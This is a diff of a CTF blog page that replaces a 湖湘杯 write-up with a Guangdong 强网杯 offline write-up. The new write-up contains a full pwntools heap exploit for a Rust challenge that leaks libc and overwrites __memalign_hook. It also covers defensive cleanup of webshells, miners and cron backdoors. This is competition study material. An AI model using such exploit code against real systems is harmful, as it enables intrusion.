@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>湖湘杯 |  H.greed</title>
+      <title>第四届广东省强网杯线下pwn |  H.greed</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="https://user-images.githubusercontent.com/72968793/136398013-abf88785-b056-4f51-aa15-a8ee261f5c7f.jpg" />
@@ -54,7 +54,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-湖湘杯"
+  id="post-第四届广东省强网杯线下pwn"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -65,7 +65,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  湖湘杯
+  第四届广东省强网杯线下pwn
 </h1>
  
 
@@ -73,15 +73,15 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2021/11/14/%E6%B9%96%E6%B9%98%E6%9D%AF/" class="article-date">
-  <time datetime="2021-11-14T10:37:33.000Z" itemprop="datePublished">2021-11-14</time>
+      <a href="/2021/11/15/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8Bpwn/" class="article-date">
+  <time datetime="2021-11-15T06:04:48.000Z" itemprop="datePublished">2021-11-15</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">732</span>
+            <span class="post-count">635</span>
         </span>
     </span>
 
@@ -105,30 +105,40 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><span id="more"></span>
+  <p>这次啊去送人头了(╥╯^╰╥)</p>
+<span id="more"></span>
 
-<h2 id="Hideit"><a href="#Hideit" class="headerlink" title="Hideit"></a>Hideit</h2><p>findcrypt搜到salsa20。先进行xxtea解密，在salsa20，所以输入为空后，输入正确的随机数。直接拿到最后的字节流，进行异或即可。</p>
-<p><img src="https://user-images.githubusercontent.com/72968793/141677275-2c81887e-97c5-422a-afa7-e58539d763c5.png" alt="image"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0x8D</span>, <span class="number">0xE2</span>, <span class="number">0x3D</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0xF2</span>, <span class="number">0x2D</span>, <span class="number">0xCA</span>, <span class="number">0x18</span>, <span class="number">0x14</span>, <span class="number">0xCF</span>, <span class="number">0x52</span>, <span class="number">0x77</span>, <span class="number">0x5A</span>, <span class="number">0x9C</span>, <span class="number">0x13</span>, <span class="number">0xAA</span>, <span class="number">0xCC</span>, <span class="number">0x04</span>, <span class="number">0x5B</span>, <span class="number">0x92</span>, <span class="number">0xC1</span>, <span class="number">0x0C</span>, <span class="number">0x68</span>, <span class="number">0x45</span>, <span class="number">0x58</span>, <span class="number">0xF9</span>, <span class="number">0x47</span>, <span class="number">0x68</span>, <span class="number">0xD9</span>, <span class="number">0x35</span>, <span class="number">0xC5</span>]</span><br><span class="line">s2 = [<span class="number">0xEB</span>, <span class="number">0x8E</span>, <span class="number">0x5C</span>, <span class="number">0xA5</span>, <span class="number">0x62</span>, <span class="number">0xB4</span>, <span class="number">0x1C</span>, <span class="number">0x84</span>, <span class="number">0x5C</span>, <span class="number">0x59</span>, <span class="number">0xFC</span>, <span class="number">0x0D</span>, <span class="number">0x43</span>, <span class="number">0x3C</span>, <span class="number">0xAB</span>, <span class="number">0x20</span>, <span class="number">0xD8</span>, <span class="number">0x93</span>, <span class="number">0x33</span>, <span class="number">0x13</span>, <span class="number">0xA1</span>, <span class="number">0x9E</span>, <span class="number">0x39</span>, <span class="number">0x00</span>, <span class="number">0x76</span>, <span class="number">0x14</span>, <span class="number">0xB5</span>, <span class="number">0x04</span>, <span class="number">0x58</span>, <span class="number">0x9D</span>, <span class="number">0x06</span>, <span class="number">0xB8</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(s1[i] ^ s2[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+<h1 id="rheap"><a href="#rheap" class="headerlink" title="rheap"></a>rheap</h1><p>这个题目很恶心，rust pwn，漏洞点是fuzz出来的UAF和堆溢出，最恶心的是输出的时候</p>
+<p>他用了编码加密，先latin-1再utf-8所以接受到数据要逆编码，编码加密怎么看出来的我是没去看了，官方给了exp</p>
+<p>吐口谈，呸，要题目的可以去我的靶场</p>
+<p><a target="_blank" rel="noopener" href="https://hexian2001.github.io/greedpwn/">https://hexian2001.github.io/greedpwn/</a></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=process(&#x27;./rheap.bak&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">r=remote(<span class="string">&#x27;47.107.51.210&#x27;</span>,<span class="number">13006</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,lens,con</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(lens))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.send(con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>): </span><br><span class="line">	add(<span class="number">0x100</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	dele(<span class="number">7</span> - i)</span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">leak=u64(r.recv(<span class="number">10</span>).decode(<span class="string">&quot;utf-8&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>): </span><br><span class="line">	add(<span class="number">0x68</span>) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>): </span><br><span class="line">	dele(i + <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">17</span>,<span class="number">1000</span>,p64(leak+libc.symbols[<span class="string">&#x27;__memalign_hook&#x27;</span>] - <span class="number">3</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>) </span><br><span class="line">edit(<span class="number">19</span>,<span class="number">1000</span>,<span class="string">b&quot;\x00&quot;</span>* <span class="number">3</span> + p64(leak + <span class="number">0x10a41c</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="tiny-httpd"><a href="#tiny-httpd" class="headerlink" title="tiny_httpd"></a><strong>tiny_httpd</strong></h2><p>这是一个超级轻量级的框架百度上有相关注释</p>
-<ol>
-<li>服务器启动，main函数调用startup函数绑定服务端口(指定端口/随机端口)</li>
-<li>main函数进入无限循环，并且由于recv调用而被阻塞，等待HTTP请求。收到请求时，将会派生一个线程运行accept_request函数，然后循环到recv调用，main函数线程继续被阻塞</li>
-<li>在accept_request函数中，通过定制的<code>get_line</code>方法，取出HTTP方法和URL，对于 GET 方法，如果有携带参数，则 <code>query_string</code> 指针指向 url 中<code>？</code>后面的 GET 参数。</li>
-<li>tinyhttpd的服务器文件是放置在以工作目录为相对路径的htdocs文件夹先，对于取出的url，先格式化到path字符数组中，如果是以<code>/</code>结尾的，或者url是目录的情况下，那么默认地在url后加上<code>index.html</code>表示访问主页。</li>
-<li>如果文件路径合法(也就是文件存在)，对于无参数的 GET 请求，读取整个HTTP请求并丢弃，然后直接输出服务器文件到浏览器，即用 HTTP 格式写到套接字上，然后关闭连接。其他情况（带参数 GET，POST 方式，url 为可执行文件），则调用 excute_cgi 函数执行 cgi 脚本。</li>
-<li>读取整个 HTTP 请求并丢弃，如果是 POST 则找出 Content-Length. 把 HTTP 200 状态码写到套接字。</li>
-<li>建立两个管道，<code>cgi_input</code> 和 <code>cgi_output</code>, 并 fork 一个进程。</li>
-<li>在子进程中，把 <code>STDOUT</code> 重定向到 <code>cgi_outputt</code> 的写入端，把 <code>STDIN</code> 重定向到 <code>cgi_input</code> 的读取端，关闭 <code>cgi_input</code> 的写入端 和 <code>cgi_output</code> 的读取端，设置 <code>request_method</code> 的环境变量，GET 的话设置 <code>query_string</code> 的环境变量，POST 的话设置 <code>content_length</code> 的环境变量，这些环境变量都是为了给 cgi 脚本调用，接着用 execl 运行 cgi 程序。</li>
-<li>在父进程中，关闭 <code>cgi_input 的读取端</code> 和 <code>cgi_output 的写入端</code>，如果 POST 的话，把 POST 数据写入 <code>cgi_input</code>，<code>cgi_input</code> 已被重定向到子进程的STDIN，读取 <code>cgi_output</code> 的管道输出，然后把<code>cgi_output</code>的输入写入到套接字中。接着关闭所有管道，等待子进程结束。</li>
-</ol>
-<p><img src="https://images2018.cnblogs.com/blog/1227331/201804/1227331-20180421141626078-1905161224.png" alt="img"><br><img src="https://images2018.cnblogs.com/blog/1227331/201804/1227331-20180421141656263-1597225349.png" alt="img"></p>
-<p>我们对题目给的源码进行结合分析，发现并没有对path变量进行任何的过滤，因此POST可以造成目录穿越漏洞</p>
-<p>最后交由execl(path, NULL);执行</p>
-<p>最后服务器监听反弹shell</p>
-<p><img src="https://user-images.githubusercontent.com/72968793/141677395-f338895e-26fe-47e3-8f8c-fafaf83115c3.png" alt="image"></p>
-<p><img src="https://user-images.githubusercontent.com/72968793/141677406-c8f8bbc6-ab08-4420-80d0-b99c32c8aabb.png" alt="image"></p>
+<h1 id="运维"><a href="#运维" class="headerlink" title="运维"></a>运维</h1><p>一、 选手信息</p>
+<p>二、 分析过程</p>
+<p>1、首先连上ssh服务之后访问/var/www/html发现有一个.2.php后门，删掉之后发现还会创建，</p>
+<p><img src="https://user-images.githubusercontent.com/72968793/141731530-878fe392-e887-41cf-a5a4-0bf08646c60a.png" alt="image"> </p>
+<p>是不死马，先把PHP进程结束掉，再启动PHP进程，就可以杀掉不死马了。</p>
+<p>2、删掉泄露信息的PHPINFO文件</p>
+<p><img src="https://user-images.githubusercontent.com/72968793/141731552-e5f1cbb0-c3fb-47b5-8d55-b3814d959ec7.png" alt="image"> </p>
+<p>3、ez_serialize.php</p>
+<p>有反序列化漏洞和变量覆盖问题，</p>
+<p>如图修改注释掉变量覆盖点，</p>
+<p>以及给cmd参数加一个过滤。</p>
+<p><img src="https://user-images.githubusercontent.com/72968793/141731597-a9a001c1-c033-4452-b733-1156ab91cc08.png" alt="image"> </p>
+<p>4、查看启动文件start.sh发现新的web服务在/home里面</p>
+<p>在WEB4目录的test文件下有这几个后门，删掉即可</p>
+<p><img src="file:///C:\Users\20138\AppData\Local\Temp\ksohtml17976\wps4.jpg" alt="img"> </p>
+<p>5、ps -Af 查看进程</p>
+<p>kill掉VIM后门</p>
+<p>6、PS查看进程</p>
+<p>杀掉挖门罗币的挖矿木马，以及c3pool目录下的挖矿木马文件。</p>
+<p>7、查看进程发现有python后门</p>
+<p>杀掉之后发现会反复重启crontab -u ctf -e 发现有定时任务，删掉这个定时任务的配置。</p>
+<p>8、清除tmp目录下的后门文件</p>
+<p>发现/tmp目录下有门罗币的挖矿病毒，删掉病毒 同时kill掉进程。</p>
+<p>9、删除.xxx这些可能存留后门文件的文件，以及hh，prism这些疑似后门的elf文件</p>
+<p><img src="https://user-images.githubusercontent.com/72968793/141731703-be6baca7-1771-40a8-ae5f-d3775d9f65c2.png" alt="image"> </p>
  
       <!-- reward -->
       
@@ -193,32 +203,21 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://hgreed.vip/2021/11/14/%E6%B9%96%E6%B9%98%E6%9D%AF/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://hgreed.vip/2021/11/15/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8Bpwn/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B9%96%E6%B9%98%E6%9D%AF/" rel="tag">湖湘杯</a></li></ul>
-
     </footer>
   </div>
 
    
   <nav class="article-nav">
     
-      <a href="/2021/11/15/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8Bpwn/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            第四届广东省强网杯线下pwn
-          
-        </div>
-      </a>
     
-    
-      <a href="/2021/11/14/%E6%B7%B1%E8%82%B2%E6%9D%AFwp/" class="article-nav-link">
+      <a href="/2021/11/14/%E6%B9%96%E6%B9%98%E6%9D%AF/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">深育杯</div>
+        <div class="article-nav-title">湖湘杯</div>
       </a>
     
   </nav>
